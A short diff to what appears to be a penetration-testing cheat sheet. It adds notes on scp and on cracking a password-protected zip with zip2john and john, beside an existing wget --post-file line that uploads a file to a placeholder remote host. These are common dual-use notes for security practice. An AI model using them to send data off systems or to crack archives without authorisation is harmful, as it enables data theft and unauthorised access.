@@ -17,3 +17,13 @@ For uploading a file to remote server,
 
 > wget --post-file=file_to_post $desIP$:$PORT$
 
+4)) scp (secure copy) command in Linux system is used to copy file(s) between servers in a secure way. The SCP command or secure copy allows secure transferring of files in between the local host and the remote host or between two remote hosts.
+
+> scp $user@ip$:file-location destination
+
+5)) If you have a password protected zip file,then you can use our useful friend john.
+
+> zip2john file.zip >> file.hash
+> john file.hash
+
+
